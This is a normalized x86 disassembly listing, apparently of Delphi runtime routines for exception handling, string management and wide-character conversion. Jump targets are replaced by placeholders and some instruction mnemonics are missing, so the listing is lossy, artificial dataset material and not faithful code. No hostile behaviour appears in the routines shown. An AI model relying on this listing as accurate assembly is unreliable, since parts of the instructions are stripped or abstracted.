jmp r-xdata
dec ecx
jne r-xdata
mov cl [ esi + 0x6 ]
cmp cl bl
je r-xdata
mov bl [ ecx + esi + 0x6 ]
xor bl [ ecx + edx ]
and bl 0xdf
jne r-xdata
mov eax [ esi + 0x2 ]
sub_403464
push ebx
push esi
push edi
mov edi ecx
xor ebx ebx
xor ecx ecx
jmp r-xdata
mov esi [ eax - 0x34 ]
test esi esi
je r-xdata
mov eax [ eax - 0x24 ]
test eax eax
jne r-xdata
mov cx [ esi ]
add esi 0x2
mov eax [ eax ]
mov [ edi ] al
jmp r-xdata
add esi 0x6
xor ecx ecx
mov cl [ esi ]
inc ecx
[ edi ] [ esi ]
mov bx [ esi ]
add esi ebx
dec ecx
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp edx [ esi + 0x2 ]
je r-xdata
sub_4034a4
push ebx
push esi
push edi
xor ecx ecx
xor edi edi
mov bl [ edx ]
push eax
mov eax [ eax - 0x24 ]
test eax eax
jne r-xdata
mov di [ esi ]
add esi 0x6
mov eax [ eax ]
mov esi [ eax - 0x38 ]
test esi esi
je r-xdata
pop edx
jmp r-xdata
mov bl [ ecx + esi + 0x6 ]
xor bl [ ecx + edx ]
and bl 0xdf
jne r-xdata
lea esi [ ecx + esi + 0x7 ]
dec edi
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov bl [ edx ]
mov cl [ esi + 0x6 ]
jmp r-xdata
dec ecx
jne r-xdata
mov cl [ esi + 0x6 ]
cmp cl bl
je r-xdata
mov eax [ esi ]
pop edx
add eax edx
sub_4034f4
push edx
push ecx
push ebx
test dl dl
jl r-xdata
xor edx edx
lea ecx [ esp + 0x10 ]
mov ebx [ fs : edx ]
mov [ ecx ] ebx
mov [ ecx + 0x8 ] ebp
mov [ ecx + 0x4 ] sub_40351d
mov [ ecx + 0xc ] eax
mov [ fs : edx ] ecx
pop ebx
pop ecx
pop edx
retn
call [ eax - 0xc ]
sub_403588
cmp [ rw-data ] 0x0
je r-xdata
retn
push eax
push eax
push edx
push esp
push 0x2
push 0x0
push 0xeedfae4
call [ rw-data ]
add esp 0x8
pop eax
sub_4035c4
cmp [ rw-data ] 0x1
jbe r-xdata
retn
push eax
push [ ebx + 0x4 ]
jmp r-xdata
push esp
push 0x1
push 0x0
push 0xeedfae0
call [ rw-data ]
add esp 0x4
pop eax
retn
sub_4035d8
cmp [ rw-data ] 0x1
jbe r-xdata
retn
push eax
push ebx
jmp r-xdata
push esp
push 0x1
push 0x0
push 0xeedfae0
call [ rw-data ]
add esp 0x4
pop eax
retn
sub_4035ec
test ecx ecx
je r-xdata
retn
mov eax [ ecx + 0x1 ]
cmp [ ecx ] 0xe9
je r-xdata
add ecx 0x5
cmp [ ecx ] 0xeb
jne r-xdata
movsx eax al
inc ecx
inc ecx
jmp r-xdata
add ecx eax
sub_40360c
cmp [ rw-data ] 0x1
jbe r-xdata
retn
push eax
push edx
push ecx
call sub_4035ec
push ecx
push esp
push 0x1
push 0x0
push 0xeedfae1
call [ rw-data ]
pop ecx
pop ecx
pop edx
pop eax
sub_403670
mov eax [ esp + 0x4 ]
test [ eax + 0x4 ] 0x6
jne r-xdata
mov eax 0x1
retn
cmp [ eax ] 0xeedfade
mov edx [ eax + 0x18 ]
mov ecx [ eax + 0x14 ]
je r-xdata
cmp [ rw-data ] 0x1
jbe r-xdata
cld
call sub_4030c4
mov edx [ rw-data ]
test edx edx
je r-xdata
or [ eax + 0x4 ] 0x2
push ebx
xor ebx ebx
push esi
push edi
push ebp
mov ebx [ fs : ebx ]
push ebx
push eax
push edx
push ecx
mov edx [ esp + 0x28 ]
push 0x0
push eax
push r-xdata
push edx
call [ rw-data ]
mov edi [ esp + 0x28 ]
call sub_405ebc
push [ eax ]
mov [ eax ] esp
mov ebp [ edi + 0x8 ]
mov ebx [ edi + 0x4 ]
mov [ edi + 0x4 ] r-xdata
add ebx 0x5
call sub_4035d8
jmp ebx
cmp [ rw-data ] 0x0
ja r-xdata
call edx
test eax eax
je r-xdata
push eax
lea eax [ esp + 0x8 ]
push edx
push ecx
push eax
call UnhandledExceptionFilter
cmp eax 0x0
pop ecx
pop edx
pop eax
je r-xdata
mov edx [ esp + 0xc ]
mov ecx [ esp + 0x4 ]
cmp [ ecx ] 0xeefface
je r-xdata
mov edx eax
mov eax [ esp + 0x4 ]
mov ecx [ eax + 0xc ]
call sub_403588
cmp [ rw-data ] 0x0
jbe r-xdata
cmp [ rw-data ] 0x0
ja r-xdata
lea ecx [ esp + 0x4 ]
push eax
push ecx
call UnhandledExceptionFilter
cmp eax 0x0
pop eax
je r-xdata
mov edx eax
mov eax [ esp + 0x4 ]
mov ecx [ eax + 0xc ]
jmp r-xdata
sub_40379c
mov eax [ esp + 0x4 ]
test [ eax + 0x4 ] 0x6
jne r-xdata
mov eax 0x1
retn
cmp [ eax ] 0xeedfade
je r-xdata
mov eax [ eax + 0x18 ]
mov eax [ eax ]
cld
call sub_4030c4
mov edx [ rw-data ]
test edx edx
je r-xdata
mov eax [ esp + 0x14 ]
cmp [ eax ] 0xeedfade
mov edx [ eax + 0x18 ]
mov ecx [ eax + 0x14 ]
je r-xdata
mov edi ebp
jmp r-xdata
call edx
test eax eax
jne r-xdata
cmp [ rw-data ] 0x1
jbe r-xdata
call [ rw-data ]
mov edx [ esp + 0x1c ]
call sub_403588
cmp [ rw-data ] 0x0
jbe r-xdata
mov eax [ eax ]
cmp eax edi
je r-xdata
mov edx [ esp + 0x8 ]
push ebx
push esi
push edi
push ebp
mov ecx [ edx + 0x4 ]
mov ebx [ ecx + 0x5 ]
lea esi [ ecx + 0x9 ]
mov ebp eax
jmp r-xdata
xor ebx ebx
mov ebx [ fs : ebx ]
push ebx
push eax
push edx
push ecx
mov edx [ esp + 0x28 ]
or [ eax + 0x4 ] 0x2
push esi
push 0x0
push eax
push r-xdata
push edx
call [ rw-data ]
pop ebx
mov edi [ esp + 0x28 ]
call sub_405ebc
push [ eax ]
mov [ eax ] esp
mov ebp [ edi + 0x8 ]
mov [ edi + 0x4 ] r-xdata
mov eax [ esp + 0x8 ]
call sub_4035c4
jmp [ ebx + 0x4 ]
cmp [ rw-data ] 0x0
ja r-xdata
mov edx eax
mov eax [ esp + 0x14 ]
mov ecx [ eax + 0xc ]
jmp r-xdata
cmp [ rw-data ] 0x0
ja r-xdata
mov ecx [ eax - 0x28 ]
cmp ecx [ edi - 0x28 ]
jne r-xdata
push eax
lea eax [ esp + 0x8 ]
push edx
push ecx
push eax
call UnhandledExceptionFilter
cmp eax 0x0
pop ecx
pop edx
pop eax
je r-xdata
lea ecx [ esp + 0x4 ]
push eax
push ecx
call UnhandledExceptionFilter
cmp eax 0x0
pop eax
je r-xdata
mov edi [ edi - 0x24 ]
mov eax [ esi ]
test edi edi
jne r-xdata
mov eax [ eax - 0x2c ]
mov edx [ edi - 0x2c ]
xor ecx ecx
mov cl [ eax ]
cmp cl [ edx ]
jne r-xdata
mov edi [ edi ]
add esi 0x8
dec ebx
jne r-xdata
inc eax
inc edx
call sub_402b34
je r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
jmp r-xdata
sub_403924
mov eax [ esp + 0x4 ]
mov edx [ esp + 0x8 ]
test [ eax + 0x4 ] 0x6
je r-xdata
mov eax 0x1
retn
mov ecx [ edx + 0x4 ]
mov [ edx + 0x4 ] r-xdata
push ebx
push esi
push edi
push ebp
mov ebp [ edx + 0x8 ]
add ecx 0x5
call sub_40360c
call ecx
pop ebp
pop edi
pop esi
pop ebx
sub_40395c
or eax eax
jne r-xdata
pop edx
push esp
push ebp
push edi
push esi
push ebx
push eax
push edx
push esp
push 0x7
push 0x1
push 0xeedfade
push edx
jmp [ rw-data ]
mov eax 0xd8
call sub_403f14
sub_403984
mov eax [ esp + 0x30 ]
mov [ eax + 0x4 ] r-xdata
call sub_405ebc
mov edx [ eax ]
mov ecx [ edx ]
mov [ eax ] ecx
mov eax [ edx + 0xc ]
and [ eax + 0x4 ] 0xfffffffd
cmp [ eax ] 0xeedfade
je r-xdata
xor eax eax
add esp 0x14
mov edx [ fs : eax ]
pop ecx
mov edx [ edx ]
mov [ ecx ] edx
pop ebp
pop edi
pop esi
pop ebx
mov eax 0x1
retn
mov eax [ edx + 0x8 ]
call sub_403190
call sub_40356c
sub_4039d8
call sub_405ebc
mov edx [ eax ]
mov ecx [ edx ]
mov [ eax ] ecx
mov eax [ edx + 0x8 ]
call sub_403190
pop edx
mov esp [ esp + 0x2c ]
xor eax eax
pop ecx
mov [ fs : eax ] ecx
pop eax
pop ebp
call sub_403634
jmp edx
sub_403a20
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
cmp eax 0xc0000092
jg r-xdata
cmp eax 0xc0000096
jg r-xdata
je r-xdata
sub eax 0xc00000fd
je r-xdata
je r-xdata
mov al 0xcf
jmp r-xdata
cmp eax 0xc000008e
jg r-xdata
mov al 0xca
jmp r-xdata
sub eax 0x3d
je r-xdata
mov al 0xda
jmp r-xdata
sub eax 0xc0000093
je r-xdata
and eax 0xff
mov edx [ edx + 0xc ]
call sub_4027e0
add eax 0x3fffff71
sub eax 0x2
jb r-xdata
je r-xdata
mov al 0xd9
jmp r-xdata
jmp r-xdata
mov al 0xce
jmp r-xdata
dec eax
je r-xdata
je r-xdata
mov al 0xc8
jmp r-xdata
sub eax 0xc0000005
je r-xdata
mov al 0xff
mov al 0xc8
jmp r-xdata
dec eax
je r-xdata
mov al 0xcd
jmp r-xdata
jmp r-xdata
mov al 0xd8
jmp r-xdata
sub eax 0x87
je r-xdata
mov al 0xd7
jmp r-xdata
jmp r-xdata
mov al 0xc9
jmp r-xdata
dec eax
je r-xdata
jmp r-xdata
sub_403b80
xor edx edx
mov eax [ rw-data ]
test eax eax
je r-xdata
retn
mov ecx [ fs : edx ]
cmp eax ecx
jne r-xdata
cmp ecx 0xffffffff
je r-xdata
mov eax [ eax ]
mov [ fs : edx ] eax
retn
cmp [ ecx ] eax
jne r-xdata
mov ecx [ ecx ]
mov eax [ eax ]
mov [ ecx ] eax
sub_403ba8
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi rw-data
mov eax [ edi + 0x8 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov ebx [ edi + 0xc ]
mov esi [ eax + 0x4 ]
xor edx edx
push ebp
push sub_403bee
push [ fs : edx ]
mov [ fs : edx ] esp
test ebx ebx
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
dec ebx
mov [ edi + 0xc ] ebx
mov eax [ esi + ebx * 8 + 0x4 ]
test eax eax
je r-xdata
test ebx ebx
jg r-xdata
call eax
sub_403c08
push ebp
mov ebp esp
push ebx
push esi
push edi
mov eax [ rw-data ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov esi [ eax ]
xor ebx ebx
mov edi [ eax + 0x4 ]
xor edx edx
push ebp
push sub_403c4e
push [ fs : edx ]
mov [ fs : edx ] esp
cmp esi ebx
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ edi + ebx * 8 ]
inc ebx
mov [ rw-data ] ebx
test eax eax
je r-xdata
cmp esi ebx
jg r-xdata
call eax
sub_403ca8
push ebx
xor ebx ebx
push edi
push esi
mov edi [ eax + ebx ]
lea esi [ eax + ebx + 0x4 ]
mov eax [ esi + 0x4 ]
mov edx [ esi ]
add eax ebx
add edx ebx
call sub_405c50
add esi 0x8
dec edi
jne r-xdata
pop esi
pop edi
pop ebx
retn
sub_403ccc
push ebx
xor ebx ebx
push edi
push esi
mov edi [ eax + ebx ]
lea esi [ eax + ebx + 0x4 ]
mov eax [ esi + 0x4 ]
mov edx [ esi ]
mov eax [ eax + ebx ]
add edx ebx
call sub_405c50
add esi 0x8
dec edi
jne r-xdata
pop esi
pop edi
pop ebx
retn
sub_403cf4
push ebx
xor ebx ebx
push edi
push esi
mov edi [ eax + ebx ]
lea esi [ eax + ebx + 0x4 ]
mov eax [ esi + 0x4 ]
mov edx [ esi ]
mov eax [ eax + ebx ]
add eax [ esi + 0x8 ]
mov [ edx + ebx ] eax
add esi 0xc
dec edi
jne r-xdata
pop esi
pop edi
pop ebx
retn
sub_403d18
push ebx
push esi
push edi
mov esi rw-data
mov cl 0x10
mov ebx [ rw-data ]
mov eax ebx
mov edi 0xa
cdq
idiv edi
add dl 0x30
xor eax eax
mov al cl
mov [ esi + eax ] dl
mov eax ebx
mov ebx 0xa
cdq
idiv ebx
mov ebx eax
dec ecx
test ebx ebx
jne r-xdata
mov cl 0x1c
mov eax [ rw-data ]
mov edx eax
and edx 0xf
mov dl [ edx + rw-data ]
xor ebx ebx
mov bl cl
mov [ esi + ebx ] dl
shr eax 0x4
dec ecx
test eax eax
jne r-xdata
pop edi
pop esi
pop ebx
retn
sub_403d74
xor eax eax
xchg [ rw-data ] eax
neg eax
sbb eax eax
inc eax
mov edi rw-data
mov ebx [ edi + 0x18 ]
mov ebp [ edi + 0x14 ]
push [ edi + 0x1c ]
push [ edi + 0x20 ]
mov esi [ edi ]
mov ecx 0xb
[ edi ] [ esi ]
pop edi
pop esi
leave
retn 0xc
sub_403da4
push ecx
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ rw-data ] 0xd7b2
jne r-xdata
pop edx
retn
push 0x0
push rw-data
push rw-data
push 0x0
call sub_40124c
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x1e
push rw-data
push 0xfffffff5
call sub_401214
push eax
call sub_401234
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x2
push r-xdata
push 0xfffffff5
call sub_401214
push eax
call sub_401234
pop edx
retn
cmp [ rw-data ] 0x0
jbe r-xdata
mov eax rw-data
call [ rw-data ]
sub_403e30
push ebx
push esi
push edi
push ebp
mov ebx rw-data
mov esi rw-data
mov edi rw-data
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ edi ] 0x0
je r-xdata
cmp [ ebx + 0x28 ] 0x2
jne r-xdata
call sub_403d18
call sub_403da4
xor eax eax
mov [ rw-data ] eax
mov edx [ edi ]
mov eax edx
xor edx edx
mov [ edi ] edx
mov ebp eax
call ebp
cmp [ edi ] 0x0
jne r-xdata
call sub_403ba8
cmp [ ebx + 0x28 ] 0x1
jbe r-xdata
cmp [ esi ] 0x0
jne r-xdata
mov eax [ ebx + 0x10 ]
test eax eax
je r-xdata
cmp [ esi ] 0x0
je r-xdata
xor eax eax
mov [ ebx + 0xc ] eax
call sub_403b80
cmp [ ebx + 0x28 ] 0x1
jne r-xdata
call sub_40571c
mov edx [ ebx + 0x10 ]
mov eax [ edx + 0x10 ]
cmp eax [ edx + 0x4 ]
je r-xdata
cmp [ ebx + 0x28 ] 0x0
je r-xdata
call [ ebx + 0x24 ]
test eax eax
je r-xdata
cmp [ ebx ] 0x0
jne r-xdata
call sub_403d74
push eax
call sub_401264
mov eax [ ebx ]
push esi
mov esi eax
mov edi ebx
mov ecx 0xb
[ edi ] [ esi ]
pop esi
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ esi ]
push eax
call ExitProcess
call [ rw-data ]
sub_403f20
mov edx [ eax ]
test edx edx
je r-xdata
retn
mov [ eax ] 0x0
mov ecx [ edx - 0x8 ]
dec ecx
jl r-xdata
[ edx - 0x8 ]
jne r-xdata
push eax
lea eax [ edx - 0x8 ]
call sub_4026fc
pop eax
sub_403f44
push ebx
push esi
mov ebx eax
mov esi edx
add ebx 0x4
dec esi
jne r-xdata
mov [ ebx ] 0x0
mov ecx [ edx - 0x8 ]
dec ecx
jl r-xdata
mov edx [ ebx ]
test edx edx
je r-xdata
pop esi
pop ebx
retn
[ edx - 0x8 ]
jne r-xdata
lea eax [ edx - 0x8 ]
call sub_4026fc
sub_403f74
test edx edx
je r-xdata
xchg [ eax ] edx
test edx edx
je r-xdata
mov ecx [ edx - 0x8 ]
inc ecx
jg r-xdata
retn
mov ecx [ edx - 0x8 ]
dec ecx
jl r-xdata
[ edx - 0x8 ]
push eax
push edx
mov eax [ edx - 0x4 ]
call sub_403fe4
mov edx eax
pop eax
push edx
mov ecx [ eax - 0x4 ]
call sub_4028d8
pop edx
pop eax
jmp r-xdata
[ edx - 0x8 ]
jne r-xdata
lea eax [ edx - 0x8 ]
call sub_4026fc
sub_403fb8
test edx edx
je r-xdata
xchg [ eax ] edx
test edx edx
je r-xdata
mov ecx [ edx - 0x8 ]
inc ecx
jle r-xdata
retn
mov ecx [ edx - 0x8 ]
dec ecx
jl r-xdata
[ edx - 0x8 ]
[ edx - 0x8 ]
jne r-xdata
lea eax [ edx - 0x8 ]
call sub_4026fc
sub_403fe4
test eax eax
jle r-xdata
xor eax eax
retn
push eax
add eax 0xa
and eax 0xfffffffe
push eax
call sub_4026dc
pop edx
mov [ edx + eax - 0x2 ] 0x0
add eax 0x8
pop edx
mov [ eax - 0x4 ] edx
mov [ eax - 0x8 ] 0x1
retn
sub_404010
push ebx
push esi
push edi
mov ebx eax
mov esi edx
mov edi ecx
mov eax edi
call sub_403fe4
mov ecx edi
mov edi eax
test esi esi
je r-xdata
mov eax ebx
call sub_403f20
mov [ ebx ] edi
pop edi
pop esi
pop ebx
retn
mov edx eax
mov eax esi
call sub_4028d8
sub_404040
push ebp
mov ebp esp
push 0x0
push 0x0
push edx
push eax
mov eax [ ebp + 0x8 ]
push eax
push ecx
push 0x0
mov eax [ rw-data ]
push eax
call WideCharToMultiByte
pop ebp
retn 0x4
sub_404060
push ebp
mov ebp esp
push edx
push eax
mov eax [ ebp + 0x8 ]
push eax
push ecx
push 0x0
mov eax [ rw-data ]
push eax
call MultiByteToWideChar
pop ebp
retn 0x4
sub_40407c
push ebx
push esi
push edi
push ebp
add esp 0xfffff004
push eax
add esp 0xfffffffc
mov esi ecx
mov [ esp ] edx
mov edi eax
test esi esi
jg r-xdata
lea ebp [ esi + 0x1 ]
cmp ebp 0x7ff
jge r-xdata
mov eax edi
call sub_403f20
jmp r-xdata
mov ebx ebp
add ebx ebx
mov eax edi
mov edx ebx
call sub_40456c
push esi
mov eax [ edi ]
mov ecx [ esp + 0x4 ]
mov edx ebx
call sub_404040
mov ebx eax
test ebx ebx
jge r-xdata
push esi
lea eax [ esp + 0x8 ]
mov ecx [ esp + 0x4 ]
mov edx 0xfff
call sub_404040
mov ebx eax
test ebx ebx
jl r-xdata
add esp 0x1004
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax edi
mov edx ebx
call sub_40456c
xor ebx ebx
lea edx [ esp + 0x4 ]
mov eax edi
mov ecx ebx
call sub_404010
jmp r-xdata
sub_404118
xor ecx ecx
test edx edx
je r-xdata
jmp sub_404010
push edx
mov ecx edx
pop edx
sub ecx edx
cmp cl [ edx + 0x1 ]
je r-xdata
inc edx
cmp cl [ edx + 0x2 ]
je r-xdata
inc edx
cmp cl [ edx + 0x3 ]
je r-xdata
inc edx
add edx 0x4
jmp r-xdata
cmp cl [ edx ]
je r-xdata
sub_404148
xor ecx ecx
test edx edx
je r-xdata
jmp sub_40407c
push edx
mov ecx edx
pop edx
sub ecx edx
shr ecx 0x1
cmp cx [ edx + 0x2 ]
je r-xdata
add edx 0x2
cmp cx [ edx + 0x4 ]
je r-xdata
add edx 0x2
cmp cx [ edx + 0x6 ]
je r-xdata
add edx 0x2
add edx 0x8
jmp r-xdata
cmp cx [ edx ]
je r-xdata
sub_404190
push edi
push eax
push ecx
mov edi edx
xor eax eax
[ edi ]
jne r-xdata
pop eax
add ecx eax
pop eax
pop edi
jmp sub_404010
not ecx
sub_4041bc
push ebx
test edx edx
je r-xdata
mov [ eax ] 0x0
pop ebx
retn
mov ebx [ edx - 0x4 ]
test ebx ebx
je r-xdata
cmp ecx ebx
jl r-xdata
mov [ eax ] cl
inc eax
xchg edx eax
call sub_4028d8
pop ebx
retn
mov ecx ebx
sub_4041e8
test edx edx
je r-xdata
retn
mov ecx [ eax ]
test ecx ecx
je sub_403f74
push ebx
push esi
push edi
mov ebx eax
mov esi edx
mov edi [ ecx - 0x4 ]
mov edx [ esi - 0x4 ]
add edx edi
cmp esi ecx
je r-xdata
call sub_40456c
mov eax [ ebx ]
mov ecx edi
jmp r-xdata
call sub_40456c
mov eax esi
mov ecx [ esi - 0x4 ]
mov edx [ ebx ]
add edx edi
call sub_4028d8
pop edi
pop esi
pop ebx
retn
sub_40422c
test edx edx
je r-xdata
mov edx ecx
jmp sub_403f74
test ecx ecx
je sub_403f74
cmp edx [ eax ]
je r-xdata
mov edx ecx
jmp sub_4041e8
cmp ecx [ eax ]
je r-xdata
push ebx
push esi
push edi
mov ebx edx
mov esi ecx
push eax
mov eax [ ebx - 0x4 ]
add eax [ esi - 0x4 ]
call sub_403fe4
mov edi eax
mov edx eax
mov eax ebx
mov ecx [ ebx - 0x4 ]
call sub_4028d8
mov edx edi
mov eax esi
mov ecx [ esi - 0x4 ]
add edx [ ebx - 0x4 ]
call sub_4028d8
pop eax
mov edx edi
test edi edi
je r-xdata
push eax
push ecx
call sub_403f74
pop edx
pop eax
jmp sub_4041e8
call sub_403f74
pop edi
pop esi
pop ebx
retn
dec [ edi - 0x8 ]
sub_4042a0
push ebx
push esi
push edi
push edx
push eax
mov ebx edx
xor edi edi
mov ecx [ esp + edx * 4 + 0x14 ]
test ecx ecx
je r-xdata
xor eax eax
cmp [ eax ] ecx
jne r-xdata
dec edx
jne r-xdata
add eax [ ecx - 0x4 ]
cmp edi ecx
jne r-xdata
mov edi ecx
mov eax [ ecx - 0x4 ]
dec edx
jmp r-xdata
mov ecx [ esp + edx * 4 + 0x14 ]
test ecx ecx
je r-xdata
test edi edi
je r-xdata
xor edi edi
call sub_403fe4
push eax
mov esi eax
mov edx eax
mov eax [ esp ]
mov esi [ edi - 0x4 ]
call sub_40456c
mov edi [ esp ]
push [ edi ]
add esi [ edi ]
dec ebx
jmp r-xdata
dec ebx
jne r-xdata
mov ecx [ eax - 0x4 ]
add esi ecx
call sub_4028d8
mov eax [ esp + ebx * 4 + 0x18 ]
mov edx esi
test eax eax
je r-xdata
pop edx
pop eax
test edi edi
jne r-xdata
pop edx
pop edi
pop esi
pop ebx
pop eax
lea esp [ esp + edx * 4 ]
jmp eax
test edx edx
je r-xdata
call sub_403f74
dec [ edx - 0x8 ]
sub_40432c
push ebx
push esi
push edi
mov esi eax
mov edi edx
cmp eax edx
je r-xdata
pop edi
pop esi
pop ebx
retn
test esi esi
je r-xdata
mov edx [ edi - 0x4 ]
sub eax edx
jmp r-xdata
test edi edi
je r-xdata
mov eax [ esi - 0x4 ]
sub eax edx
jmp r-xdata
mov eax [ esi - 0x4 ]
mov edx [ edi - 0x4 ]
sub eax edx
ja r-xdata
push edx
shr edx 0x2
je r-xdata
add edx eax
pop edx
and edx 0x3
je r-xdata
mov ecx [ esi ]
mov ebx [ edi ]
cmp ecx ebx
jne r-xdata
add eax eax
jmp r-xdata
mov ecx [ esi ]
mov ebx [ edi ]
cmp cl bl
jne r-xdata
pop edx
cmp cl bl
jne r-xdata
dec edx
je r-xdata
dec edx
je r-xdata
cmp ch bh
jne r-xdata
add esi 0x4
add edi 0x4
mov ecx [ esi + 0x4 ]
mov ebx [ edi + 0x4 ]
cmp ecx ebx
jne r-xdata
cmp ch bh
jne r-xdata
shr ecx 0x10
shr ebx 0x10
cmp cl bl
jne r-xdata
add esi 0x8
add edi 0x8
dec edx
jne r-xdata
dec edx
je r-xdata
cmp ch bh
jmp r-xdata
and ebx 0xff0000
and ecx 0xff0000
cmp ecx ebx
jne r-xdata
sub_4043ec
mov edx [ eax ]
test edx edx
je r-xdata
mov eax edx
retn
mov ecx [ edx - 0x8 ]
dec ecx
je r-xdata
push ebx
mov ebx eax
mov eax [ edx - 0x4 ]
call sub_403fe4
mov edx eax
mov eax [ ebx ]
mov [ ebx ] edx
push eax
mov ecx [ eax - 0x4 ]
call sub_4028d8
pop eax
mov ecx [ eax - 0x8 ]
dec ecx
jl r-xdata
mov edx [ ebx ]
pop ebx
[ eax - 0x8 ]
jne r-xdata
lea eax [ eax - 0x8 ]
call sub_4026fc
sub_404440
push ebx
test eax eax
je r-xdata
mov eax [ esp + 0x8 ]
call sub_403f20
mov ebx [ eax - 0x4 ]
test ebx ebx
je r-xdata
dec edx
jl r-xdata
xor edx edx
jmp r-xdata
cmp edx ebx
jge r-xdata
sub ebx edx
test ecx ecx
jl r-xdata
cmp ecx ebx
jg r-xdata
mov ecx ebx
jmp r-xdata
add edx eax
mov eax [ esp + 0x8 ]
call sub_404010
jmp r-xdata
pop ebx
retn 0x4
sub_404480
push ebx
push esi
push edi
mov ebx eax
mov esi edx
mov edi ecx
call j_sub_4043ec#2
mov edx [ ebx ]
test edx edx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov ecx [ edx - 0x4 ]
dec esi
jl r-xdata
cmp esi ecx
jge r-xdata
test edi edi
jle r-xdata
sub ecx esi
cmp edi ecx
jle r-xdata
sub ecx edi
add edx esi
lea eax [ edi + edx ]
call sub_4028d8
mov edx [ ebx ]
mov eax ebx
mov edx [ edx - 0x4 ]
sub edx edi
call sub_40456c
mov edi ecx
sub_4044c8
test eax eax
je r-xdata
retn
push ebx
push esi
push edi
push ebp
mov ebx eax
mov esi edx
mov edi ecx
mov edx [ edx ]
push edx
test edx edx
je r-xdata
dec edi
jge r-xdata
mov edx [ edx - 0x4 ]
cmp edi edx
jle r-xdata
xor edi edi
mov ebp [ ebx - 0x4 ]
mov eax esi
add edx ebp
call sub_40456c
pop eax
cmp eax ebx
jne r-xdata
mov edi edx
mov eax [ esi ]
lea edx [ edi + ebp ]
mov ecx [ eax - 0x4 ]
sub ecx edx
add edx eax
add eax edi
call sub_4028d8
mov eax ebx
mov edx [ esi ]
mov ecx ebp
add edx edi
call sub_4028d8
pop ebp
pop edi
pop esi
pop ebx
mov ebx [ esi ]
sub_404524
test eax eax
je r-xdata
retn
test edx edx
je r-xdata
xor eax eax
retn
push ebx
push esi
push edi
mov esi eax
mov edi edx
mov ecx [ edi - 0x4 ]
push edi
mov edx [ esi - 0x4 ]
dec edx
js r-xdata
pop edx
xor eax eax
jmp r-xdata
mov al [ esi ]
inc esi
sub ecx edx
jle r-xdata
pop edi
pop esi
pop ebx
[ edi ]
jne r-xdata
mov ebx ecx
push esi
push edi
mov ecx edx
[ esi ] [ edi ]
pop edi
pop esi
je r-xdata
pop edx
mov eax edi
sub eax edx
mov ecx ebx
jmp r-xdata
sub_40456c
push ebx
push esi
push edi
mov ebx eax
mov esi edx
xor edi edi
test edx edx
jle r-xdata
mov eax ebx
call sub_403f20
mov [ ebx ] edi
mov eax [ ebx ]
test eax eax
je r-xdata
mov eax edx
call sub_403fe4
mov edi eax
mov eax [ ebx ]
test eax eax
je r-xdata
cmp [ eax - 0x8 ] 0x1
jne r-xdata
mov edx edi
mov ecx [ eax - 0x4 ]
cmp ecx esi
jl r-xdata
sub eax 0x8
add edx 0x9
push eax
mov eax esp
call sub_40271c
pop eax
add eax 0x8
mov [ ebx ] eax
mov [ eax - 0x4 ] esi
mov [ esi + eax ] 0x0
jmp r-xdata
call sub_4028d8
mov ecx esi
pop edi
pop esi
pop ebx
retn
sub_404618
push ebx
push esi
mov ebx eax
mov esi edx
add ebx 0x4
dec esi
jne r-xdata
mov [ ebx ] 0x0
push eax
call SysFreeString
mov eax [ ebx ]
test eax eax
je r-xdata
pop esi
pop ebx
retn
sub_40463c
test edx edx
je sub_404600
mov ecx [ edx - 0x4 ]
shr ecx 0x1
je sub_404600
push ecx
push edx
push eax
call SysReAllocStringLen
test eax eax
je r-xdata
mov al 0x1
jmp sub_402838
retn
sub_404660
push ebx
push esi
push edi
push ebp
add esp 0xfffff004
push eax
add esp 0xfffffffc
mov esi ecx
mov [ esp ] edx
mov edi eax
test esi esi
jg r-xdata
lea ebp [ esi + 0x1 ]
cmp ebp 0x7ff
jge r-xdata
mov eax edi
call sub_404600
jmp r-xdata
mov ebx ebp
mov eax edi
mov edx ebx
call sub_404848
push esi
mov eax [ edi ]
mov ecx [ esp + 0x4 ]
mov edx ebx
call sub_404060
mov ebx eax
test ebx ebx
jge r-xdata
push esi
lea eax [ esp + 0x8 ]
mov ecx [ esp + 0x4 ]
mov edx 0x7ff
call sub_404060
mov ebx eax
test ebx ebx
jle r-xdata
add esp 0x1004
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax edi
mov edx ebx
call sub_404848
xor ebx ebx
lea edx [ esp + 0x4 ]
mov eax edi
mov ecx ebx
call sub_4046ec
jmp r-xdata
sub_4046ec
test ecx ecx
je sub_404600
push eax
push ecx
push edx
call SysAllocStringLen
test eax eax
je r-xdata
mov al 0x1
jmp sub_402838
pop edx
push [ edx ]
mov [ edx ] eax
call SysFreeString
retn
sub_404710
xor ecx ecx
test edx edx
je r-xdata
jmp sub_4046ec
push edx
mov ecx edx
pop edx
sub ecx edx
shr ecx 0x1
cmp cx [ edx + 0x2 ]
je r-xdata
add edx 0x2
cmp cx [ edx + 0x4 ]
je r-xdata
add edx 0x2
cmp cx [ edx + 0x6 ]
je r-xdata
add edx 0x2
add edx 0x8
jmp r-xdata
cmp cx [ edx ]
je r-xdata
sub_404778
push ebx
push esi
push edi
mov esi eax
mov edi edx
cmp eax edx
je r-xdata
pop edi
pop esi
pop ebx
retn
test esi esi
je r-xdata
mov edx [ edi - 0x4 ]
sub eax edx
jmp r-xdata
test edi edi
je r-xdata
mov eax [ esi - 0x4 ]
sub eax edx
jmp r-xdata
mov eax [ esi - 0x4 ]
mov edx [ edi - 0x4 ]
sub eax edx
